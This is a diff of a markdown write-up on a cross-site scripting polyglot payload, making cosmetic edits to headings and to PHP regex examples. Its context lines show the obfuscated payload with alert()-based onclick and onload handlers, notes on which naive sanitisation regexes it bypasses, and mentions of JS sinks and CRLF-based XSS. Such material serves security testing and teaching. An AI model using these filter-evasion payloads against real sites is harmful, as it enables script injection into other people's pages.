@@ -53,7 +53,7 @@ _Demo: <https://jsbin.com/diwedo>_
 
 ```
 _Demo: <https://jsbin.com/zizuvad>_
-* __HTML-escaped unquoted tag attributes (requires a click):__
+* __HTML-escaped unquoted tag attributes (may require a click):__
 ```html
 
 <img border=3 alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e>
@@ -176,7 +176,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 ```
 _Demo: <https://jsbin.com/vovogo>_
 
-##### JS sinks:
+##### _JS sinks_:
 * __`eval`:__
 ````javascript
 
@@ -240,31 +240,31 @@ As you might have already noticed, the polyglot has been crafted with filter eva
 
 * `jaVasCript:`, `oNcliCk`, et al. bypasses: 
 ```php
-preg_replace('/\b(?:javascript:|on\w+=)/', '', $payload);
+preg_replace('/\b(?:javascript:|on\w+=)/', '', PAYLOAD);
 ```
 
 * ``` /*`/*\` ``` bypasses: 
 ```php
-preg_replace('/`/', '\`', $payload);
+preg_replace('/`/', '\`', PAYLOAD);
 ```
 
 * ``` </stYle/</titLe/</teXtarEa/</scRipt/--!> ``` bypasses: 
 ```php
-preg_replace('/<\/\w+>/', '', $payload);
+preg_replace('/<\/\w+>/', '', PAYLOAD);
 ```
 
 * `--!>` bypasses: 
 ```php
-preg_replace('/-->/', '', $payload);
+preg_replace('/-->/', '', PAYLOAD);
 ```
 
 * ``` <sVg/oNloAd=alert()//> ``` bypasses:
 ```php
-preg_replace('/<\w+\s+/', '', $payload);
+preg_replace('/<\w+\s+/', '', PAYLOAD);
 ```
 
 ## Bonus attacking contexts covered:
-#### CRLF-based cross site scripting:
+#### CRLF-based XSS:
 ````http
 
 HTTP/1.1 200 OK
